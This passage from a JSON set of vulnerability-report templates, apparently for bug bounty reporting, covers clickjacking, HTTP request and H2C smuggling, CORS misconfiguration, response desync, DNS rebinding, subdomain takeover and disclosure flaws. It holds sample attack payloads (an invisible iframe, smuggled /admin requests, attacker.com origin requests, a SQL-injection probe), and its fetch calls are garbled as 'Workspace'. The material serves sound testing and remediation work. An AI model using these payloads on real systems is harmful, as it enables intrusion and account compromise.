                  "target": "[Specify affected asset, e.g., banking.example.com]",
                  "url_location": "[Full URL of the page, e.g., https://banking.example.com/transfer_funds]",
                  "steps_to_reproduce": [
                    "1. Identify a sensitive page within the application (e.g., a money transfer form, a password change page, a 'delete account' button).",
                    "2. Inspect the HTTP response headers for the `X-Frame-Options` header.",
                    "3. **[Scenario A: Header is Missing]**",
                    "   a. **[What happened]**: The `X-Frame-Options` header is not present.",
                    "   b. **[What should happen]**: `X-Frame-Options: DENY` or `SAMEORIGIN` should be set.",
                    "4. **[Scenario B: Header is Misconfigured (e.g., `ALLOW-FROM attacker.com`)]**",
                    "   a. **[What happened]**: The header is present but explicitly allows framing from specific (potentially attacker-controlled) origins or uses an insecure value like `ALLOW-FROM *` (though `*` is not a valid value for `ALLOW-FROM`).",
                    "   b. **[What should happen]**: It should be set to `DENY` for most sensitive pages or `SAMEORIGIN` if framing by the same domain is required.",
                    "5. Create a simple HTML page on an attacker-controlled domain (e.g., `attacker.com`) with an `<iframe>` embedding the vulnerable page. Example: `<iframe src=\"https://banking.example.com/transfer_funds\" style=\"position:absolute; left:0px; top:0px; width:500px; height:500px; opacity:0;\"></iframe>`.",
                    "6. Host this HTML page and verify that the vulnerable page loads inside the `<iframe>`.",
                    "7. (Optional) Create a Clickjacking overlay to demonstrate the attack: position transparent malicious UI elements over the legitimate buttons/links of the embedded page."
                  ],
                  "proof_of_concept": {
                    "response_header_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n",
                    "notes": "Provide the URL of the affected page. Show the HTTP response headers (e.g., screenshot from developer tools) clearly indicating the missing or misconfigured `X-Frame-Options` header. Include a screenshot of the vulnerable page successfully embedded within an `<iframe>` on an attacker-controlled page, demonstrating the potential for Clickjacking."
                  },
                  "impact": "Clickjacking attacks, where users are tricked into performing unintended actions (e.g., transferring funds, changing passwords, making purchases, granting permissions) by clicking on invisible UI elements. This undermines user trust and can lead to financial losses or account compromise.",
                  "remediation_suggestion": "Implement the `X-Frame-Options` HTTP header on all pages, especially sensitive ones. Recommended values: `DENY` (prevents any framing) or `SAMEORIGIN` (allows framing only by pages from the same origin). Configure this header at the web server (Nginx, Apache) or application framework level. For more granular control, use `Content-Security-Policy: frame-ancestors 'self' [trusted_origins];` which is a more modern and flexible alternative."
                },
                {
                  "vulnerability_name": "X-Content-Type-Options Missing",
                  "summary": "Missing `X-Content-Type-Options` HTTP header allows browsers to perform 'MIME sniffing,' where they attempt to guess the correct content type of a resource regardless of the `Content-Type` header specified by the server. This can lead to security vulnerabilities, particularly when untrusted content (e.g., user uploads) is served, as a browser might interpret an image as an executable script, leading to XSS.",
                  "severity": "Low",
                  "target": "[Specify affected asset, e.g., static.example.com]",
                  "url_location": "[Any page serving user-controlled content, e.g., https://static.example.com/uploads/image.jpg]",
                  "steps_to_reproduce": [
                    "1. Identify an endpoint that serves user-uploaded content (e.g., image uploads, document uploads).",
                    "2. Inspect the HTTP response headers for such content, looking for the `X-Content-Type-Options` header.",
                    "3. **[What happened]**: The `X-Content-Type-Options` header is missing.",
                    "4. **[What should happen]**: `X-Content-Type-Options: nosniff` should be set to prevent MIME sniffing.",
                    "5. **(Optional) Demonstrate the MIME sniffing vulnerability:**",
                    "   a. Upload a malicious file (e.g., a JavaScript file named `image.jpg` with `alert(1)` inside, setting its `Content-Type` header to `image/jpeg` during upload, but if the server doesn't validate actual content, it might be stored).",
                    "   b. If the server serves this file, and the `X-Content-Type-Options` is missing, try to navigate to its URL. A browser might then sniff the content and execute the JavaScript despite the `.jpg` extension and `image/jpeg` Content-Type.",
                    "   c. **[What happened]**: The browser executes the JavaScript, causing an `alert` box to appear."
                  ],
                  "proof_of_concept": {
                    "response_header_example": "HTTP/1.1 200 OK\nContent-Type: image/jpeg\n\n",
                    "notes": "Provide the URL of the affected resource (e.g., a user-uploaded image). Show the HTTP response headers (e.g., screenshot from developer tools) clearly indicating the absence of the `X-Content-Type-Options` header. If possible, demonstrate a successful MIME sniffing attack by showing a script executing when the browser incorrectly interprets a file."
                  },
                  "impact": "Increased risk of Cross-Site Scripting (XSS) attacks, particularly in scenarios involving user-uploaded content or when serving content with an incorrect `Content-Type` header. Browsers might execute scripts disguised as other file types, leading to data theft, session hijacking, or defacement.",
                  "remediation_suggestion": "Implement the `X-Content-Type-Options: nosniff` HTTP header on all responses, especially those serving user-controlled content or content where the `Content-Type` might be ambiguous. This instructs the browser to strictly follow the `Content-Type` header provided by the server. Configure this header at the web server (Nginx, Apache) or application framework level. Always validate file uploads on the server-side, including magic bytes, to ensure the true content type."
                },
                {
                  "vulnerability_name": "HTTP Request Smuggling",
                  "summary": "HTTP Request Smuggling exploits discrepancies in how frontend proxies/CDNs and backend web servers interpret the boundary between requests (specifically the `Content-Length` and `Transfer-Encoding` headers). This allows an attacker to 'smuggle' a second, arbitrary request within a single HTTP request, bypassing security controls, gaining access to internal resources, and performing cache poisoning.",
                  "severity": "Critical",
                  "target": "[Specify affected asset, e.g., gateway.example.com]",
                  "url_location": "[Any endpoint served by a proxy, e.g., https://gateway.example.com/]",
                  "steps_to_reproduce": [
                    "1. Identify an application that uses a frontend proxy (e.g., CDN, load balancer, WAF) in front of a backend web server.",
                    "2. Determine how the frontend and backend interpret `Content-Length` (CL) and `Transfer-Encoding` (TE) headers. Common methods involve sending requests with both headers and observing how the server/proxy responds.",
                    "3. **[Common Smuggling Scenarios]**",
                    "   a. **CL.TE (Frontend uses CL, Backend uses TE):** Send a request where `Content-Length` is set to the length of the *first* part of the request, and `Transfer-Encoding: chunked` defines the full length, including a smuggled request.",
                    "      `POST / HTTP/1.1\nHost: example.com\nContent-Length: 4\nTransfer-Encoding: chunked\n\n1\nX\n0\n\nGET /admin HTTP/1.1\nHost: example.com\n\n`",
                    "   b. **TE.CL (Frontend uses TE, Backend uses CL):** Send a request where `Transfer-Encoding: chunked` indicates a short chunk, but `Content-Length` indicates a longer payload, including a smuggled request.",
                    "      `POST / HTTP/1.1\nHost: example.com\nTransfer-Encoding: chunked\nContent-Length: 100\n\n0\n\nGET /admin HTTP/1.1\nHost: example.com\n\n`",
                    "   c. **TE.TE (Frontend and Backend both use TE, but interpret it differently):** Variations in chunk encoding or malformed chunk lengths can be exploited.",
                    "4. Send the crafted smuggled request. Observe the application's behavior and the response from the backend to identify if the smuggled request was processed.",
                    "5. **[Impact-specific demonstration]**",
                    "   a. **Cache Poisoning:** Smuggle a request that includes a malicious header/body, then request a cacheable resource. Observe if the cache is poisoned for other users.",
                    "   b. **Bypassing Authentication/WAF:** Smuggle a request to an `/admin` endpoint after a benign prefix. Observe if the `/admin` endpoint is accessed without proper authentication/WAF scrutiny.",
                    "   c. **Accessing Internal Endpoints:** Smuggle a request to an internal-only API endpoint.",
                    "   d. **Session Fixation/Hijacking:** Smuggle requests that manipulate cookies or session IDs."
                  ],
                  "proof_of_concept": {
                    "request_example": "POST / HTTP/1.1\nHost: example.com\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: example.com\n\n",
                    "notes": "Provide the exact HTTP request demonstrating the smuggling attack. Explain which parts are interpreted by the frontend and backend. Show the unexpected response from the server that confirms the smuggled request was processed (e.g., 200 OK from `/admin` without authentication, or cache poisoning results). A video demonstrating the attack is highly effective."
                  },
                  "impact": "Bypassing security controls (WAFs, authentication, rate limiting). Cache poisoning, leading to widespread XSS or defacement. Access to internal API endpoints or administrative functionalities. Session hijacking. Can lead to severe system compromise and data breaches, often enabling critical impacts.",
                  "remediation_suggestion": "Ensure consistent interpretation of `Content-Length` and `Transfer-Encoding` headers across all components (proxy, web server, application server). Ideally, standardize on one (e.g., `Content-Length`) and remove the other. If `Transfer-Encoding` is used, ensure robust parsing and rejection of malformed chunked requests. Canonicalize HTTP requests before forwarding them to the backend. Use a robust WAF specifically designed to mitigate HTTP Request Smuggling. Keep all server and proxy software updated."
                },
                {
                  "vulnerability_name": "H2C Smuggling",
                  "summary": "H2C Smuggling (HTTP/2 Cleartext Smuggling) exploits the ability of some HTTP/2 servers to negotiate a cleartext HTTP/2 connection (`h2c`) even when the initial request is HTTP/1.1. If an intermediary proxy/CDN fails to properly handle or strip certain HTTP/2 headers during this negotiation, it can lead to HTTP Request Smuggling-like vulnerabilities.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., gateway.example.com]",
                  "url_location": "[Full URL of the vulnerable endpoint, e.g., http://gateway.example.com/]",
                  "steps_to_reproduce": [
                    "1. Identify an application endpoint that is served by a proxy and communicates with a backend that supports HTTP/2.",
                    "2. Send an HTTP/1.1 request that attempts to upgrade to HTTP/2 with `h2c` in cleartext (e.g., via `Connection: Upgrade, HTTP2-Settings` headers).",
                    "   `GET / HTTP/1.1\nHost: example.com\nConnection: Upgrade, HTTP2-Settings\nUpgrade: h2c\nHTTP2-Settings: AAMAAABkAARbAAIAAAAAAAAECAAAAAAAABAAABaAAAAAADUFAAAAAAAAScAAAABAQA`",
                    "3. If the upgrade is successful, the connection becomes an HTTP/2 connection over cleartext. This often bypasses proxy checks designed for HTTP/1.1.",
                    "4. Within this H2C connection, send a second, 'smuggled' HTTP/2 request that targets an internal endpoint or attempts to bypass security controls (e.g., `Host` header manipulation for cache poisoning, or requesting `/admin` without authentication).",
                    "   a. The specific smuggling technique for HTTP/2 involves manipulating `Host` header, `Path` pseudo-header (`:path`), or other HTTP/2 specific behaviors after the upgrade.",
                    "5. **[What happened]**: The frontend proxy forwards the H2C connection, and the backend processes the smuggled HTTP/2 request without the proxy's usual security checks.",
                    "6. **[What should happen]**: Proxies should either not allow H2C upgrades or should correctly handle and strip HTTP/2 specific headers before forwarding to the backend, or completely terminate the H2C connection."
                  ],
                  "proof_of_concept": {
                    "request_example": "GET / HTTP/1.1\nHost: example.com\nConnection: Upgrade, HTTP2-Settings\nUpgrade: h2c\nHTTP2-Settings: AAMAAABkAARbAAIAAAAAAAAECAAAAAAAABAAABaAAAAAADUFAAAAAAAAScAAAABAQA\n\n[Followed by HTTP/2 frames, e.g., a smuggled request to /admin]",
                    "notes": "This is a complex vulnerability to demonstrate. Provide the HTTP/1.1 request that initiates the H2C upgrade. If possible, show a capture of the network traffic demonstrating the successful upgrade and the subsequent smuggled HTTP/2 frames. Show the response from the backend confirming the smuggled request was processed. Tools like `h2csmuggler` can be used."
                  },
                  "impact": "Similar to HTTP Request Smuggling: bypassing security controls (WAFs, authentication), cache poisoning, and access to internal resources. Can lead to severe system compromise and data breaches, as it exploits a fundamental protocol confusion.",
                  "remediation_suggestion": "Configure frontend proxies to strip or normalize `Connection` and `Upgrade` headers, preventing HTTP/2 cleartext upgrades. Ensure that the proxy fully terminates the HTTP/1.1 connection and initiates a new, clean HTTP/2 connection to the backend if HTTP/2 is desired. Implement robust HTTP/2 validation and parsing on both proxy and backend. Regularly update and patch all components involved in the request handling chain."
                },
                {
                  "vulnerability_name": "CORS - Misconfigurations & Bypass",
                  "summary": "CORS (Cross-Origin Resource Sharing) misconfigurations allow an attacker to bypass the Same-Origin Policy (SOP), enabling malicious JavaScript on one domain to make unauthorized requests to another domain. This can lead to sensitive data disclosure, CSRF bypass, or arbitrary actions on behalf of the victim.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., api.example.com]",
                  "url_location": "[Full URL of the vulnerable endpoint, e.g., https://api.example.com/user/profile]",
                  "steps_to_reproduce": [
                    "1. Identify an API endpoint that handles sensitive data or actions.",
                    "2. **[Scenario A: Reflected Origin without Validation]**",
                    "   a. Send a preflight `OPTIONS` request with `Origin: https://attacker.com`.",
                    "   b. **[What happened]**: The server reflects `https://attacker.com` back in `Access-Control-Allow-Origin` without strict validation (e.g., it allows subdomains like `attacker.com.example.com` or prefixes like `example.com.attacker.com`).",
                    "   c. **[What should happen]**: The `Origin` header should be validated against a strict whitelist of allowed domains.",
                    "3. **[Scenario B: Wildcard Origin with Credentials Allowed]**",
                    "   a. Send an `OPTIONS` request. **[What happened]**: The server responds with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`.",
                    "   b. **[What should happen]**: This combination is explicitly forbidden by the CORS specification and allows any origin to make credentialed requests.",
                    "4. **[Scenario C: Null Origin Allowed]**",
                    "   a. Send an `OPTIONS` request with `Origin: null`.",
                    "   b. **[What happened]**: The server responds with `Access-Control-Allow-Origin: null`.",
                    "   c. **[What should happen]**: Allowing `null` origin is rarely secure and should only be enabled for specific, isolated use cases (e.g., local file operations).",
                    "5. **[Scenario D: Internal Domains Exposed]**",
                    "   a. If the whitelist for `Access-Control-Allow-Origin` includes internal domains (e.g., `internal.example.com`) that might be vulnerable to other attacks (e.g., DNS Rebinding).",
                    "   b. **[What happened]**: An attacker could use a DNS Rebinding attack to control `internal.example.com` and then leverage the permissive CORS policy to access the target API.",
                    "   c. **[What should happen]**: Whitelist should only contain public, trusted domains.",
                    "6. **[Scenario E: Non-standard Headers Reflected]**",
                    "   a. Send an `OPTIONS` request with a custom header (e.g., `Access-Control-Request-Headers: X-Foo`).",
                    "   b. **[What happened]**: The server reflects `Access-Control-Allow-Headers: X-Foo` without validation, potentially allowing injection of sensitive headers.",
                    "7. After identifying a misconfiguration, demonstrate data retrieval or action execution using JavaScript on an attacker-controlled page (e.g., `Workspace('https://api.example.com/user/profile', {credentials: 'include'})`)."
                  ],
                  "proof_of_concept": {
                    "request_example": "OPTIONS /user/profile HTTP/1.1\nHost: api.example.com\nOrigin: https://attacker.com.example.com\nAccess-Control-Request-Method: GET",
                    "response_example": "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://attacker.com.example.com\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Methods: GET",
                    "notes": "Provide the exact HTTP request and response headers demonstrating the CORS misconfiguration. Include the JavaScript code on the attacker's site that successfully exploits the misconfiguration (e.g., a `Workspace` request that retrieves sensitive data). Screenshots of the browser console showing the successful request and retrieved data are effective."
                  },
                  "impact": "Bypassing Same-Origin Policy, leading to sensitive data disclosure (e.g., PII, session data, internal API responses), unauthorized actions (e.g., fund transfers, profile updates) by enabling CSRF, and potential for web-based malware distribution. Can lead to account takeover.",
                  "remediation_suggestion": "Implement a strict whitelist for `Access-Control-Allow-Origin`. Never use `Access-Control-Allow-Origin: *` in combination with `Access-Control-Allow-Credentials: true`. Avoid reflecting the `Origin` header directly. Validate `Origin` against a precise list of trusted domains using string comparisons or robust URL parsing, not regex that might allow subdomains/prefixes. Only allow `null` origin if absolutely necessary. Strictly define `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` to necessary values. Understand the implications of `Access-Control-Allow-Credentials`."
                },
                {
                  "vulnerability_name": "HTTP Desync/Response Smuggling",
                  "summary": "HTTP Desync (or Response Smuggling) occurs when a frontend proxy/load balancer and a backend server have different views of the same HTTP response. An attacker can craft a response from the backend that the proxy misinterprets, leading to the proxy prepending portions of the attacker's response to a subsequent legitimate user's request, resulting in sensitive data exposure or cache poisoning.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., gateway.example.com]",
                  "url_location": "[Any endpoint served by a proxy, e.g., https://gateway.example.com/]",
                  "steps_to_reproduce": [
                    "1. Identify an application that uses a frontend proxy (e.g., CDN, load balancer) in front of a backend web server.",
                    "2. Look for inconsistencies in how the proxy and backend handle HTTP response headers, particularly `Content-Length` and `Transfer-Encoding` in the response.",
                    "3. **[Scenario: Backend sends conflicting `Content-Length` / `Transfer-Encoding`]**",
                    "   a. Craft a request that makes the backend send a response with conflicting `Content-Length` and `Transfer-Encoding` headers (e.g., using a non-existent endpoint or a specific request parameter that triggers this behavior).",
                    "   b. **[What happened]**: The backend responds with a chunked response, but also includes a `Content-Length` header that doesn't match the actual chunked body. The frontend proxy might only read based on `Content-Length`, leaving the remaining chunked data in the connection buffer.",
                    "   c. **[What should happen]**: Backend and proxy should consistently interpret response boundaries.",
                    "4. The remaining data in the buffer (attacker-controlled) is then prepended to the *next* user's response that reuses the same connection.",
                    "5. Observe a subsequent request from a legitimate user. **[What happened]**: The legitimate user receives an unexpected prefix in their response, containing sensitive data from a previous request or attacker-injected content.",
                    "   a. This can be used to inject XSS payloads, expose sensitive data from other users' requests, or poison caches.",
                    "6. **[Key difference from Request Smuggling]** Request Smuggling is about sending two requests in one. Response Smuggling is about the backend sending one response that the frontend splits into two, affecting a subsequent *different* request."
                  ],
                  "proof_of_concept": {
                    "response_example_backend_sends": "HTTP/1.1 200 OK\nContent-Length: 10\nTransfer-Encoding: chunked\n\nA\nHello World!\n0\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Poisoned!</h1>",
                    "response_example_victim_receives": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Poisoned!</h1>\n\n<original_content_for_victim_request>",
                    "notes": "This is a highly advanced vulnerability. Describe the specific headers and content that trigger the desync. Provide the backend response that leads to the desync. Show the *victim's* subsequent request and the malformed response they receive, demonstrating the injected content. This often requires precise timing and manipulation of HTTP headers."
                  },
                  "impact": "Information disclosure (leaking one user's response to another), cache poisoning, HTTP header injection, and client-side attacks like XSS. Can lead to sensitive data breaches and compromise of user sessions. Difficult to detect and mitigate due to its subtle nature.",
                  "remediation_suggestion": "Ensure consistent interpretation of `Content-Length` and `Transfer-Encoding` headers on both the backend and frontend proxies. If `Transfer-Encoding: chunked` is used, ensure the backend *never* sends a `Content-Length` header. Prefer robust, modern HTTP stack implementations that are resistant to such desynchronization attacks. Close connections after each request if a desync is suspected or observed (though this impacts performance). Regularly patch and update all web server, proxy, and load balancer software."
                },
                {
                  "vulnerability_name": "DNS Rebinding",
                  "summary": "DNS Rebinding allows an attacker to bypass the Same-Origin Policy (SOP) by manipulating DNS records. An attacker sets up a malicious domain that initially resolves to an IP address they control, allowing them to serve malicious JavaScript. Then, they quickly re-resolve the same domain to an internal IP address (e.g., `127.0.0.1` or a private network address), causing the malicious JavaScript to then interact with internal network resources while still appearing to be same-origin to the browser.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., internal-api.example.com]",
                  "url_location": "[Any public-facing application that interacts with internal resources, e.g., https://app.example.com/]",
                  "steps_to_reproduce": [
                    "1. An attacker sets up a malicious DNS server and registers a domain (e.g., `rebind.attacker.com`).",
                    "2. The DNS server is configured to initially return the IP address of the attacker's malicious web server (e.g., `1.1.1.1`) with a very short TTL (e.g., 0-1 second).",
                    "3. The malicious web server hosts a JavaScript file that does the following:",
                    "   a. Makes an initial request to `rebind.attacker.com` (which resolves to `1.1.1.1`). This serves the malicious JavaScript.",
                    "   b. After a short delay (to allow DNS cache to expire), the JavaScript then attempts to make requests to `rebind.attacker.com` again.",
                    "4. The attacker's DNS server then resolves `rebind.attacker.com` to an internal IP address (e.g., `127.0.0.1` or `192.168.1.100`) with a short TTL.",
                    "5. **[What happened]**: The victim's browser, thinking `rebind.attacker.com` is still same-origin, attempts to make requests to `127.0.0.1` or `192.168.1.100`. If an application is running on those internal addresses (e.g., a local API, a router config page, a development server), the malicious JavaScript can interact with it, bypassing SOP.",
                    "   a. This can be used to scan internal networks, access private APIs, or perform actions on internal devices.",
                    "6. **[What should happen]**: Applications should validate the `Host` header for requests to internal services, and browsers/DNS resolvers should have stronger anti-rebinding protections."
                  ],
                  "proof_of_concept": {
                    "notes": "This is complex to demonstrate without a controlled lab environment. Describe the DNS configuration (initial IP, rebind IP, TTLs). Provide the JavaScript code that performs the rebinding requests. Show network logs or application logs from the *internal* service showing requests originating from the victim's browser via the rebinding attack (e.g., requests to `127.0.0.1:8080/internal_api`)."
                  },
                  "impact": "Bypassing the Same-Origin Policy (SOP), leading to unauthorized access to internal network resources, local services (e.g., database, router, development servers), and potentially sensitive data within the internal network. Can facilitate internal network reconnaissance, data exfiltration, and service disruption.",
                  "remediation_suggestion": "For server-side applications: Validate the `Host` header for all incoming requests. Reject requests if the `Host` header does not match a whitelist of legitimate domains. Do not accept requests with internal IP addresses as the `Host`. For client-side: Ensure browser's DNS cache has a minimum TTL. Implement `X-Content-Type-Options: nosniff` to prevent browser interpretation of malicious content. For internal services, bind them to specific interfaces, not `0.0.0.0`."
                },
                {
                  "vulnerability_name": "Domain/Subdomain Takeover",
                  "summary": "Domain/Subdomain Takeover occurs when an attacker gains control over a domain or subdomain that was previously legitimate but is no longer actively managed. This happens if the domain's DNS records (e.g., CNAME, NS, A) point to a service that has been decommissioned or made available for registration (e.g., an unprovisioned S3 bucket, an unclaimed Heroku app, a dangling DNS record to a defunct CDN endpoint).",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., docs.example.com]",
                  "url_location": "[The affected domain/subdomain, e.g., https://docs.example.com/]",
                  "steps_to_reproduce": [
                    "1. Identify subdomains or domains belonging to the target organization.",
                    "2. Look for domains that return unusual errors (e.g., 'NoSuchBucket' for S3, 'There's nothing here' for Heroku, specific errors from cloud services like CloudFront, Azure, GitHub Pages).",
                    "3. Use tools like `dig`, `nslookup`, or online DNS checkers to investigate the DNS records (especially CNAME, NS, A records) of these domains.",
                    "4. **[Scenario A: Dangling CNAME to Unclaimed Cloud Service]**",
                    "   a. A subdomain `docs.example.com` has a CNAME record pointing to `example-bucket.s3-website-us-east-1.amazonaws.com`.",
                    "   b. Attempt to register/provision a bucket/application named `example-bucket` on the respective cloud service (S3, Heroku, Azure Web Apps, etc.) under your attacker account.",
                    "   c. **[What happened]**: The attacker successfully provisions the service and now controls the content served by `docs.example.com`.",
                    "   d. **[What should happen]**: DNS records should be removed or updated when a service is decommissioned.",
                    "5. **[Scenario B: Dangling NS Record]**",
                    "   a. A domain's NS (Name Server) records point to name servers that are no longer managed by the organization or are available for registration.",
                    "   b. **[What happened]**: An attacker can register the name servers and control the entire domain's DNS.",
                    "6. **[Scenario C: Dangling A Record to Unclaimed IP]**",
                    "   a. A domain's A record points to an IP address that is unassigned or available for allocation by a cloud provider.",
                    "   b. **[What happened]**: An attacker can spin up a server at that IP address and claim the domain.",
                    "7. After takeover, the attacker can host arbitrary content on the domain (e.g., phishing pages, malware, defacement, bypass CORS/CSP if the domain was whitelisted by other applications)."
                  ],
                  "proof_of_concept": {
                    "dns_record_example": "docs.example.com. IN CNAME example-bucket.s3-website-us-east-1.amazonaws.com.",
                    "notes": "Provide the vulnerable domain/subdomain and its specific DNS record (e.g., CNAME). Describe the error message observed before takeover. State the cloud service or platform involved. Provide a screenshot of the attacker-controlled content hosted on the *taken-over* domain (e.g., a simple 'Pwned' page). Do not actually host malicious content if reporting, use a benign indicator."
                  },
                  "impact": "Reputational damage and loss of trust. Phishing attacks (users trust the legitimate domain). Malware distribution. Session hijacking if the domain was used for authentication (e.g., cookie domain scope). Bypassing security controls like CORS or CSP if the taken-over domain was in a whitelist. SEO manipulation. Can lead to significant financial and security implications.",
                  "remediation_suggestion": "Regularly audit DNS records for all domains and subdomains. Remove DNS records (especially CNAME, NS, A records) that point to decommissioned or unmanaged services. Ensure all cloud resources (S3 buckets, Azure App Services, Heroku apps) are properly de-provisioned or have unique, non-guessable names. Implement continuous monitoring for dangling DNS records. For CNAMEs pointing to cloud services, use the `CNAME` record in conjunction with the cloud provider's ownership verification mechanism."
                },
                {
                  "vulnerability_name": "Using Components with Known Vulnerabilities",
                  "summary": "Using Components with Known Vulnerabilities (also known as 'Vulnerable Dependencies') occurs when an application incorporates software libraries, frameworks, or other third-party components that contain known security flaws. Attackers can exploit these flaws, even if the application's custom code is secure, leading to various impacts like RCE, data breaches, or denial of service.",
                  "severity": "Varies (Critical to Low, depending on component vulnerability)",
                  "target": "[Specify affected asset, e.g., backend.example.com or frontend.example.com]",
                  "url_location": "[Any page/API endpoint using the vulnerable component, e.g., https://backend.example.com/api/v1/data]",
                  "steps_to_reproduce": [
                    "1. Identify the technologies and libraries used by the application (e.g., JavaScript libraries, backend frameworks, CMS plugins, server versions).",
                    "2. **[Scenario A: Software Version Identification]**",
                    "   a. Inspect HTTP headers (`Server`, `X-Powered-By`).",
                    "   b. Analyze client-side JavaScript files for known library versions (e.g., jQuery, AngularJS).",
                    "   c. Look for `CHANGELOG.md`, `package.json`, `pom.xml`, `requirements.txt` files if accessible (e.g., through misconfigured servers or public repositories).",
                    "   d. Use automated tools like Retire.js (for JS libraries), OWASP Dependency-Check, or Snyk to scan dependencies.",
                    "3. **[Scenario B: Match Known Vulnerabilities]**",
                    "   a. Once a component and its version are identified, search public vulnerability databases (e.g., CVE Details, NVD, Exploit-DB, Snyk Vulnerability Database) for known vulnerabilities associated with that specific version.",
                    "   b. **[What happened]**: The application uses `Spring Framework 5.3.0`, which is known to be vulnerable to CVE-2022-22965 (Spring4Shell).",
                    "   c. **[What should happen]**: All components should be updated to versions without known vulnerabilities.",
                    "4. **[Scenario C: Demonstrate Exploit (if possible and ethical)]**",
                    "   a. If a public exploit exists for the identified vulnerability, attempt to run it against the target (only in authorized testing environments).",
                    "   b. **[What happened]**: The exploit successfully triggers the vulnerability (e.g., remote code execution, SQL injection, information disclosure)."
                  ],
                  "proof_of_concept": {
                    "vulnerable_component": "Apache Struts 2.3.31 (CVE-2017-5638)",
                    "notes": "Clearly state the vulnerable component, its exact version, and the associated CVE ID(s). Provide a link to the vulnerability description (e.g., NVD or a reputable security advisory). If an exploit was attempted (in a controlled environment), describe the steps and the successful outcome (e.g., 'Successfully executed `whoami` via OGNL injection')."
                  },
                  "impact": "The impact varies widely depending on the specific vulnerability in the component, ranging from minor information disclosure to critical Remote Code Execution (RCE), data breaches, denial of service, and full system compromise. Vulnerable components are a significant attack surface.",
                  "remediation_suggestion": "Regularly audit and update all third-party components (libraries, frameworks, plugins) to their latest stable versions that address known vulnerabilities. Use Software Composition Analysis (SCA) tools (e.g., OWASP Dependency-Check, Snyk, Black Duck) as part of the CI/CD pipeline to automatically identify vulnerable dependencies. When updating is not immediately possible, apply virtual patches or custom workarounds to mitigate the specific vulnerability. Remove unused dependencies."
                },
                {
                  "vulnerability_name": "Error Message / Stack Trace Disclosure",
                  "summary": "Error Message / Stack Trace Disclosure occurs when an application exposes detailed error messages, stack traces, database errors, or other debugging information directly to users in production environments. This sensitive information provides attackers with valuable insights into the application's internal structure, technologies, file paths, and potential vulnerabilities.",
                  "severity": "Low",
                  "target": "[Specify affected asset, e.g., app.example.com]",
                  "url_location": "[Any endpoint triggering an error, e.g., https://app.example.com/invalid_route]",
                  "steps_to_reproduce": [
                    "1. Attempt to trigger various error conditions in the application:",
                    "   a. Access non-existent URLs (e.g., `https://app.example.com/does_not_exist_12345`).",
                    "   b. Provide invalid input to forms or API endpoints (e.g., non-numeric where numeric is expected, overly long strings).",
                    "   c. Attempt SQL injection syntax in parameters (e.g., `' OR 1=1--`).",
                    "   d. Force unhandled exceptions (e.g., divide by zero if possible in a calculated field).",
                    "   e. Try to access resources with incorrect parameters (e.g., missing IDs).",
                    "2. **[Scenario A: Detailed Stack Trace]**",
                    "   a. **[What happened]**: The application displays a full stack trace, revealing programming language, framework versions, internal file paths, class names, and method calls.",
                    "   b. **[What should happen]**: Generic error messages should be displayed to the user in production.",
                    "3. **[Scenario B: Database Error Messages]**",
                    "   a. **[What happened]**: The application displays raw database error messages (e.g., 'SQLSTATE[23000]: Integrity constraint violation', 'ORA-00942: table or view does not exist'), revealing database type, table/column names, or query structure.",
                    "   b. **[What should happen]**: Database errors should be caught and presented as generic application errors.",
                    "4. **[Scenario C: Configuration File Paths/Sensitive Data]**",
                    "   a. **[What happened]**: Error messages inadvertently reveal paths to configuration files, environment variables, or other sensitive system details.",
                    "   b. **[What should happen]**: Sensitive information should never be present in error messages.",
                    "5. Collect all disclosed information and analyze it for potential leads to further vulnerabilities."
                  ],
                  "proof_of_concept": {
                    "error_message_example": "Oops! An unhandled exception occurred.\nTraceback (mosts recent call last):\n  File \"/var/www/html/app/routes.py\", line 42, in get_user_data\n    user = User.query.filter_by(id=request.args.get('id')).first()\n  File \"/usr/local/lib/python3.8/site-packages/sqlalchemy/engine/base.py\", line 1234, in execute\n    raise exc.DBAPIError(e, statement, parameters)",
                    "notes": "Provide the exact URL that triggers the error and a screenshot or the full text of the error message/stack trace. Highlight the sensitive information exposed (e.g., 'Python version 3.8, SQLAlchemy used, internal file path `/var/www/html/app/routes.py` revealed')."
                  },
                  "impact": "Information disclosure that aids attackers in reconnaissance. Reveals details about the application's architecture, programming language, frameworks, database type, internal file paths, and potentially unhandled error conditions. This information can be used to craft highly targeted attacks (e.g., guessing default credentials, exploiting specific framework vulnerabilities, identifying SQL injection points).",
                  "remediation_suggestion": "Disable verbose error messages and stack traces in production environments. Configure the application to display generic, user-friendly error pages (e.g., 'An unexpected error occurred'). Ensure that detailed error logs are written to a secure, internal logging system (e.g., ELK stack) and are not accessible publicly. Implement robust error handling (try-catch blocks) to gracefully manage exceptions and prevent information leakage. Review and sanitize any debugging information in production."
                },
                {
                  "vulnerability_name": "Information Disclosure",
                  "summary": "Information Disclosure occurs when an application inadvertently reveals sensitive information to an attacker, such as internal network details, debugging information, user data, or technology stack details. This information can aid attackers in reconnaissance and help them identify further vulnerabilities.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., app.example.com]",
                  "url_location": "[Any publicly accessible URL, e.g., https://app.example.com/favicon.ico]",
                  "steps_to_reproduce": [
                    "1. Systematically explore the application and its exposed assets.",
                    "2. **[Scenario A: Verbose Error Messages / Stack Traces]**",
                    "   a. Attempt to trigger various error conditions (e.g., invalid parameters, non-existent URLs, malformed requests).",
                    "   b. **[What happened]**: The application displays detailed error messages, stack traces, or database errors, revealing internal file paths, technology versions, or database schema information.",
                    "   c. **[What should happen]**: Generic error messages should be displayed to the user.",
                    "3. **[Scenario B: Directory Listing]**",
                    "   a. Navigate to common directories or guess directory names (e.g., `/backups/`, `/test/`, `/uploads/`, `/admin/`).",
                    "   b. **[What happened]**: The web server provides a full directory listing, exposing file names, versions, and potentially sensitive documents.",
